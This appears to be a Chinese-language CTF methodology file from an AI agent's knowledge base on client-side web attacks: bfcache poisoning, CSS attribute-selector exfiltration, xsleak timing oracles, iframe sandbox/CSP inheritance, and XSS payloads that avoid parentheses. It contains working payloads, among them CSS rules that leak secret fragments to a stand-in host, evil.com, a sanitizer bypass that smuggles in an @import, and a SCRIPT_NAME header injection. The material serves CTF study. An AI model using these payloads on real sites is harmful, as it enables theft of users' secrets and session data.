# Web 客户端攻击方法论 — bfcache/CSS exfil/xsleak/iframe

> 当遇到 client-side web 题（有 admin bot + flag 在 bot 端）时通过 Read 工具加载。
> 服务端攻击（SSTI/SQLi/SSRF）见 `$AGENT_DIR/knowledge-base/web-vulnerabilities.md`。

## 触发条件

- 题目有 **admin bot**（提交 URL → bot 访问）+ flag 在 bot 的 cookie/页面/localStorage
- 或 CSP 封死 XSS 但需要外带数据
- 或涉及浏览器行为差异（bfcache/iframe/CSS/CSP 继承）

## §1 快速定性：client-side vs server-side

| 特征 | 判定 | 方向 |
|------|------|------|
| 有 admin bot + 提交 URL | client-side | XSS / xsleak / CSS exfil / bfcache |
| 纯后端逻辑、无 bot | server-side | SSTI / SQLi / SSRF / 反序列化 |
| CSP 封死 JS 但留 `style-src 'unsafe-inline'` | client-side | **CSS injection exfil** |
| CSP 封死但能触发行为差异 | client-side | **xsleak（时间/资源/状态侧信道）** |

## §2 bfcache 污染攻击

> bfcache（Back-Forward Cache）冻结页面离开时的**完整状态**（含 fetch 发出的响应）。

**场景**: 目标页 navigate 时返回脱敏内容，但内部 `fetch(同URL)` 拿原始内容

```
攻击步骤:
  1. 在目标 origin 访问 target.html
     → 页面内部 fetch('target.html')，fetch 的响应进 bfcache
  2. 把同一 tab 导航到攻击者控制的 origin
  3. 执行 history.back() / history.go(-1)
     → bfcache 载入，此时拿到的是 fetch 的原始响应，sanitize 被绕过
```

**关键限制**：
- Chrome 默认开 bfcache；2025/09 起连 `Cache-Control:no-store` 也开 bfcache
- 用 `new WebSocket()` 主动禁掉 bfcache（连接存在时页面不进 bfcache）
- 也可利用 bfcache 让 fetch 携带攻击者 header（如带 SCRIPT_NAME header 绕过校验）

## §3 CSS trigram exfil（通用数据外带框架）

> CSP 封死 JS 时，用 CSS 属性选择器 + 资源加载做数据外带。

### 基本原理
```css
/* 匹配 secret 片段 → 加载攻击者 URL 泄漏 */
[secret*="abc"] { --abc: url("//evil.com/leak?q=abc"); }
.p { background-image: var(--abc, none); }
```

### trigram 切片（加速）
单字符逐个 leak 需要多轮请求。改用 **3-gram + -webkit-cross-fade** 在单次请求中并行检测所有组合（字符集按目标定: hex secret → 16³=4096 条规则；字母数字 nonce → 36³=46656 条规则）:
```css
[secret*="a3f"] { --a3f: url("//evil.com/leak?q=a3f"); }
/* 用 -webkit-cross-fade 把所有规则挂到一个元素，命中即发请求 */
.p { background-image: -webkit-cross-fade(url("/"), var(--a3f,none), 50%) ...; }
```
**服务端还原**：收集泄漏的 trigram → 按"后缀==前缀"做欧拉路径/回溯合并还原原串。

### sanitizer 绕过
```css
/* @font-feature-values 的 cssText 序列化会去掉单引号 */
@font-feature-values 'lol; @\0069mport "//evil.com/x";p' {}
/* 序列化后变成真正的 @import，偷渡外部 CSS */
```
> 注: 该 bug 已被 Chromium 修复（chromium-review 5604769），仅对旧版 Chrome 有效。

### sanitizer 非递归检查绕过（@container / @scope）
部分 sanitizer 只检查顶层 CSS rule，不递归检查 `@container`/`@scope` 内的 selector:
```css
.container{ container-type: inline-size; }
@container (min-width: 500px) {
  /* selector 藏在 @container 里绕过顶层检查 */
  :host-context(body[secret^="00"]) p { color: red; }
}
```
`:host-context(ancestor)` 从 shadow DOM 内部选中 shadow 外部的祖先元素——CSS exfil 跨 shadow 边界的通用手法。

### 无 @import/url 时的触发器
```html
<!-- lazy-loading img：display:none 时不加载，CSS 命中改 display:block 才发请求 -->
<img class="i00" loading="lazy" src="//evil.com/leak?q=i00" style="display:none">
```

## §4 xsleak oracle 列表

> 无法 XSS 时，用侧信道判断 secret（"无 XSS 也能拿 flag"）。

| Oracle 类型 | 原理 | 典型利用 |
|------------|------|---------|
| 加载时长 | secret 正确时加载更多资源/更长处理 | `performance.now()` 测耗时二分 |
| about:blank 判定 | 跨域导航后 `about:blank` 的 origin 可推断 | `window.frames[0].origin` try/catch |
| crash | 特定 payload 导致页面崩溃 | 崩溃 vs 正常的行为差异 |
| 资源计数 | secret 命中时多加载资源 | `PerformanceObserver` 监听 resource 条目 |
| error 计数 | secret 影响错误数量 | `window.onerror` 计数 |
| 重定向次数 | secret 影响重定向链 | `performance.navigation.redirectCount` |

**扩展 timing 侧信道**:
- **指数膨胀链**: Chrome 扩展 content-script 逐 phrase `replaceAll`。构造 phrase list 使命中后文档体积指数增长（O(2^n)），~20 条规则可膨胀到 ~10GB。优化: `[CENSORED]` 含两个 `E`，直接用 `"E"` 作 phrase 每轮翻倍，规则数减半。
- **检测手法（跨域 iframe timing oracle）**: 把受害页放 iframe，用 `iframe.src = iframe.src`（设成相同值，**不是** `location.reload()`——跨域被禁）触发 reload，测第二次起的 load 事件延迟；reload 10 次取最慢，阈值 ~2000ms。第一次 load 在 content script 卡顿前触发，不计。

## §5 iframe reparenting / sandbox / CSP 继承

> 点"后退"时，iframe 的 **sandbox 跟随当前最新页面**，但 **src/srcdoc 的 CSP 继承 session history 里的旧状态**。

```
攻击步骤:
  1. 第一帧：开页 A 内嵌 <iframe sandbox srcdoc=PAYLOAD>
     → PAYLOAD 被沙箱+空CSP挡住（但不报错）
  2. top-level 导航到页 B（内容 <iframe></iframe>）
  3. history.back()
     → reparenting 把旧 src 内容塞回 iframe
     → sandbox 随当前页 = 无
     → srcdoc 的 CSP 随旧 session = 空
     → script 执行！
```
**注意**: 依赖 Chrome 旧版行为，新版需用 WebSocket 禁 bfcache 复现。

## §6 其他客户端原语速查

### connection pool + 递归 @import（无需自有服务器）
Chrome 每域约 6（H1）/255（H2）连接上限。占满连接池 → 暂停/恢复目标页 CSS 请求 → 递归 `@import` 逐字符 leak。
**核心价值**: 传统递归 @import 需自有服务器 stall 下一个 CSS；此法在另一个 tab 用 255 个 H2 连接占满连接池，即可控制目标域 CSS 加载时机——**`style-src 'self'`（无法外连）时仍能递归 leak**。需准备 buffer CSS（只 @import 另一个的空 CSS）缓冲初始并发请求。

### cookie tossing
在目标域的可控子域写 cookie → 父域读取。`public suffix`（如 `*.usercontent.goog`）内无法直接 toss → 构造 HTTP 子域 `http://sbx-fake.sbx-real.host/`。

### 解析器差异 checklist
| 差异 | 利用 |
|------|------|
| URL parser 差异 | `data://host/;base64` lib 当 domain，浏览器发到别处 |
| `parseInt` 宽松 | `parseInt('123abc')===123` 绕过 key 校验 |
| `[A-z]` 正则陷阱 | `[A-z]` 含 `[\]^_\``，正则校验形同虚设 |
| streaming HTML + charset | data: URI 一次性校验 CSP 通过；分块流式解析时 charset 切换使 CSP 失效 |
| gunicorn SCRIPT_NAME | `-H "SCRIPT_NAME: //evil/"` 让 url_for 渲染出攻击者域 |

### XSS 无括号无分号
严格 sanitizer 过滤 `()` `;` 时的可用 payload。原理: tagged template 或 onerror=eval + throw。

**方法 1: Tagged template + Function 构造器**（无括号）
```javascript
// 直接执行 alert（只能调无参函数）
alert`test`
// 用 Function 构造器执行任意代码（最后两个反引号执行生成的函数）
Function`alert(1)```
// 括号用 Unicode 绕过（\x28=\( \x29=\)）
Function`alert\u00281\u0029```
// 从 location.hash 取代码（hash 设为 #alert(1)）
Function`_${location.hash.slice`1`}```
```

**方法 2: onerror=eval + throw**（无括号）
```javascript
// Chrome 错误前缀是 "Uncaught"（合法 JS 变量名，Uncaught=alert(1) 即赋值语句）
// throw 的字符串变成错误信息 "Uncaught <payload>"，被 eval 执行
onerror=eval; throw '=alert(1)'      // "Uncaught =alert(1)" → 执行 alert(1)
// 用 \x28 \x29 绕括号过滤
onerror=eval; throw '=alert\x281\x29'
```

**方法 3: 再省去分号**（无括号无分号）
```javascript
// 用 block {} 分隔语句（throw 是 statement 不能放逗号后）
{onerror=alert}throw 1
// 或用逗号表达式（onerror 赋值是 expression）
throw onerror=eval,1
```

## §7 工具链

| 工具 | 用途 |
|------|------|
| Burp Suite + Turbo Intruder | 单包攻击（见 `race-conditions.md`）、DOM Invader（自动找 DOM XSS/PP 源/sink） |
| Playwright | admin bot 交互、批量二分 leak、timing oracle |
| 自建 express/fastify | CSS leak server、bfcache/reparenting 复现台 |
| 多版本 Chrome | 旧版 Chrome 行为差异是 exploit 前置条件 |

## §8 关联文件

- `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` — 服务端漏洞模式
- `$AGENT_DIR/knowledge-base/race-conditions.md` — 单包攻击 + 原型链污染
- `$AGENT_DIR/knowledge-base/csp-bypass.md` — CSP 绕过专题
- `$AGENT_DIR/knowledge-base/browser-debugging.md` — 浏览器调试方法
